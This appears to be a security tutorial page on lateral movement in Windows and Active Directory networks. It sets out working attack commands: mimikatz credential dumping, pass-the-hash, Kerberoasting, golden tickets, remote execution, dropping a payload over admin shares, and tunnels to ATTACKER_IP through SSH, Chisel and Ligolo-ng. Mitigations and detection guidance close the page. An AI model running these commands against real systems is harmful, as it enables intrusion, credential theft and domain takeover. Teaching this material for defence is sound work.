Lateral Movement

Post-exploitation · MITRE ATT&CK TA0008 · Pivot from one compromised host across the internal network to reach high-value targets

Lateral movement is the process of expanding access from an initial foothold to other systems in the internal network. The attacker uses credentials, trust relationships, and network protocols to hop from machine to machine — reaching domain controllers, databases, file servers, and other high-value targets that are not directly exposed to the internet.

The attacker's goal — Domain Admin

In an Active Directory environment, the ultimate target is the Domain Controller. Owning the DC means owning every machine in the domain — you can create users, reset passwords, push malware via GPO, and extract all credentials with a single command. Lateral movement is the path to get there from any initial foothold.

Pass-the-Hash — reuse NTLM hash without cracking
Pass-the-Ticket — steal and reuse Kerberos tickets
Kerberoasting — crack service account passwords offline
SSH pivoting — tunnel through compromised hosts
Credential reuse — same password across hosts
WMI/PSExec — remote execution via admin shares

After landing on an internal host, enumerate the network before moving. Understanding what exists and how it's connected shapes every subsequent step.

Network discovery from compromised host
# Current host's network info ip addr / ifconfig # IP, subnet, interfaces ip route / route -n # routing table — what subnets are reachable? cat /etc/hosts # local DNS overrides arp -a # ARP cache — recently seen hosts # Discover live hosts (ping sweep) for i in $(seq 1 254); do ping -c1 -W1 10.10.1.$i >/dev/null 2>&1 && echo "10.10.1.$i up"; done # Or with nmap (if available): nmap -sn 10.10.1.0/24 # ping scan, no port scan # Port scan discovered hosts nmap -sV -p 22,80,443,445,3389,5985,1433,3306 10.10.1.0/24 # 445 = SMB (Windows lateral movement) # 5985 = WinRM (remote PowerShell) # 3389 = RDP # 22 = SSH # 1433 = MSSQL # Active Directory enumeration (if Windows domain) net user /domain # all domain users net group /domain # all domain groups net group "Domain Admins" /domain # who has DA? nltest /dclist:corp.local # find domain controllers

Pass-the-Hash (PtH)Most common Windows lateral move

Windows NTLM authentication accepts a hash directly — no need to crack it. Steal an NTLM hash from memory and use it to authenticate as that user on other machines.

# Step 1: Dump NTLM hashes with mimikatz (from admin shell) privilege::debug sekurlsa::logonpasswords # Output: Username: Administrator NTLM: aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c # Step 2: Use hash to authenticate to other machines (no cracking!) # impacket-psexec (Linux) impacket-psexec Administrator@10.10.1.20 -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c # CrackMapExec — spray hash across all machines crackmapexec smb 10.10.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c # Shows which hosts have the same local admin password # Evil-WinRM (WinRM remote shell) evil-winrm -i 10.10.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
KerberoastingAD — offline hash crack

Any domain user can request a service ticket (TGS) for any service account in AD. The ticket is encrypted with the service account's password hash — take it offline and crack it.

# Step 1: Find service accounts (SPNs registered in AD) # Any domain user can do this: impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.1.5 -request # Or with PowerView: Get-DomainUser -SPN | select samaccountname, serviceprincipalname # Step 2: Request TGS tickets (saved to file) impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.1.5 -request -outputfile kerberoast.txt # Step 3: Crack offline — no network connection to target needed hashcat -a 0 -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule # Cracked password = service account password # Service accounts often have excessive privileges → lateral movement or DA
Pass-the-Ticket (PtT) & Golden TicketAD — Kerberos abuse
# Pass-the-Ticket — steal and reuse an existing Kerberos ticket # Export tickets with mimikatz: sekurlsa::tickets /export # Loads ticket into current session: kerberos::ptt C:\path\to\ticket.kirbi # Golden Ticket — forge ANY Kerberos ticket using krbtgt hash # Requires: krbtgt NTLM hash (get via DCSync or DC compromise) # Step 1: Get krbtgt hash lsadump::dcsync /user:krbtgt # Step 2: Forge golden ticket (gives DA to ANY domain user, forever) kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt # → Full domain admin access with a forged ticket # → Persists even after password changes (until krbtgt is reset TWICE)
Remote execution — PSExec, WMI, WinRM, SMBHigh
# PSExec (uses SMB admin shares — creates a service) impacket-psexec corp.local/Administrator:'Password123!'@10.10.1.20 # Or with hash: impacket-psexec Administrator@10.10.1.20 -hashes :NTLM_HASH # WMI execution (stealthier — no service created) impacket-wmiexec Administrator:'Password123!'@10.10.1.20 wmic /node:10.10.1.20 /user:Administrator /password:Password123! process call create "cmd.exe /c whoami > C:\output.txt" # WinRM (PowerShell remoting — port 5985/5986) evil-winrm -i 10.10.1.20 -u Administrator -p 'Password123!' Enter-PSSession -ComputerName 10.10.1.20 -Credential (Get-Credential) # SMB file drop + execution # Copy payload to admin share, then run: copy shell.exe \\10.10.1.20\C$\Windows\Temp\ sc \\10.10.1.20 create shell binpath= "C:\Windows\Temp\shell.exe" start= auto sc \\10.10.1.20 start shell

Pivoting creates a tunnel through a compromised host so you can reach internal network segments that are not directly accessible from your attack machine.

SSH port forwarding & SOCKS proxy
# Local port forward — access internal DB from attacker machine # Scenario: DB at 10.10.1.20:3306 only reachable from 10.10.1.10 ssh -L 3306:10.10.1.20:3306 user@10.10.1.10 # Now: mysql -h 127.0.0.1 -P 3306 connects through the tunnel # Dynamic SOCKS proxy — route ALL traffic through pivot host ssh -D 1080 user@10.10.1.10 # Configure proxychains: socks5 127.0.0.1 1080 proxychains nmap -sT -p 22,80,443,445 10.10.2.0/24 # scan segment 2 proxychains impacket-psexec Administrator@10.10.2.50 # lateral move to seg 2 # Remote port forward — expose internal service to attacker # (useful when attacker can't SSH in but target can SSH out) ssh -R 8080:127.0.0.1:80 attacker@ATTACKER_IP # ATTACKER_IP:8080 now reaches target's localhost:80
Chisel — HTTP tunnel (firewall bypass)
# Chisel creates a TCP/UDP tunnel over HTTP — bypasses firewalls blocking non-HTTP # Attacker (server): ./chisel server -p 8080 --reverse # Target (client) — outbound HTTP allowed, looks like normal web traffic: ./chisel client ATTACKER_IP:8080 R:socks # Creates a SOCKS5 proxy on attacker's 127.0.0.1:1080 # Use proxychains through the Chisel tunnel: proxychains crackmapexec smb 10.10.1.0/24 -u Administrator -H NTLM_HASH # Chisel with specific port forward: ./chisel client ATTACKER_IP:8080 R:3389:10.10.1.20:3389 # Now RDP to 127.0.0.1:3389 on attacker → reaches 10.10.1.20:3389 via tunnel
Ligolo-ng — layer 3 tunnel (cleanest option)
# Ligolo-ng creates a virtual network interface — no proxychains needed # Attacker (server): ./proxy -selfcert -laddr 0.0.0.0:11601 # Target (agent): ./agent -connect ATTACKER_IP:11601 -ignore-cert # On attacker — add route to internal subnet: ip route add 10.10.1.0/24 dev ligolo # Start tunnel in ligolo console: session → start # Now ALL tools work natively — no proxychains: nmap -sV 10.10.1.0/24 # full network scan evil-winrm -i 10.10.1.20 # direct WinRM ssh user@10.10.1.30 # direct SSH
Multi-hop pivoting — chaining through segments
# Scenario: Attacker → Segment 1 (10.10.1.x) → Segment 2 (10.10.2.x) # Can only reach 10.10.2.x through 10.10.1.10 # Option 1: SSH chain (-J jump host) ssh -J user@10.10.1.10 user@10.10.2.20 # SSH directly to 10.10.2.20 via pivot # Option 2: Nested proxychains # First tunnel: SOCKS on 1080 via 10.10.1.10 ssh -D 1080 user@10.10.1.10 # Second tunnel: SOCKS on 1081 via 10.10.2.10 (through first tunnel) proxychains ssh -D 1081 user@10.10.2.10 # Now: proxychains -q (with 1081) can reach 10.10.3.x # Option 3: Ligolo double pivot # Add second agent on 10.10.2.20 # Add route: ip route add 10.10.2.0/24 dev ligolo2

① Disable NTLM — force Kerberos authentication Blocks PtH at root
Pass-the-Hash only works because NTLM accepts a hash directly. Disabling NTLM and enforcing Kerberos eliminates the attack surface. Requires modern Windows and careful testing — some legacy apps use NTLM.
# Group Policy: disable NTLM # Computer Config > Windows Settings > Security Settings > Local Policies # > Security Options > Network Security: Restrict NTLM # PowerShell — require Kerberos Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5 # Level 5 = only NTLMv2, refuse NTLMv1 & LM # Enable Protected Users group — members cannot use NTLM Add-ADGroupMember -Identity "Protected Users" -Members "AdminUser" # Protected Users also: no credential caching, no delegation
② Enable Credential Guard & Protected LSASS Blocks mimikatz
Credential Guard moves LSASS credentials into an isolated VBS (Virtualization Based Security) container — mimikatz and other tools cannot read them even with SYSTEM privileges.
# Enable Credential Guard via Group Policy # Device Guard and Credential Guard → Turn on Credential Guard # Or directly: reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f # Enable PPL (Protected Process Light) for LSASS reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f # Requires UEFI secure boot + Secure Boot DB signing
③ Reduce Kerberoasting attack surface Essential
Kerberoastable accounts are only a problem if their passwords are weak. Use strong random passwords for service accounts and enable AES-only encryption.
# Find Kerberoastable accounts (run this yourself) Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Mitigations: # 1. Use Group Managed Service Accounts (gMSA) — 120-char auto-rotating passwords New-ADServiceAccount -Name "WebSvc" -DNSHostName "web.corp.local" -PrincipalsAllowedToRetrieveManagedPassword "WebServers" # 2. Disable RC4 encryption for SPNs — force AES (much harder to crack) Set-ADUser -Identity svc_web -KerberosEncryptionType AES256 # 3. Mark sensitive accounts as "Account is sensitive and cannot be delegated"
④ Network segmentation — limit blast radius Defense in depth
Even with credentials, an attacker can't reach what they can't route to. Segment the network so that compromise of one zone doesn't expose others.
# Key segmentation principles: # - DMZ should NOT have direct routes to internal subnets # - Workstations should NOT be able to reach servers directly (client isolation) # - Lateral movement over SMB (445) between workstations → BLOCK # - WinRM (5985) and RDP (3389) → only allowed FROM jump hosts, not peer-to-peer # Windows Firewall GPO — block lateral movement ports between workstations: # netsh advfirewall firewall add rule name="Block SMB Lateral" dir=in action=block protocol=TCP localport=445 # Apply to all workstations, except from IT management subnet
⑤ Detection — what to watch for
# Windows Event Log indicators: # 4624 — Logon (Type 3 = network logon, Type 10 = remote interactive) # 4625 — Failed logon (spray attempts) # 4648 — Logon with explicit credentials (runas / PtH attempt) # 7045 — New service installed (PSExec creates a service) # 4769 — Kerberos TGS request (many in short time = Kerberoasting) # 4662 — DCSync: Object access with replication rights # Suspicious patterns: # - Admin account logging into workstations it never touches # - Service account logging in interactively (should only be NETWORK logons) # - Lateral tool signatures: PSExec service name "PSEXESVC" # - Large number of TGS requests from single user in short window # - LSASS access from non-system processes (mimikatz signature) # Tools: Microsoft Defender for Identity, Velociraptor, Elastic SIEM
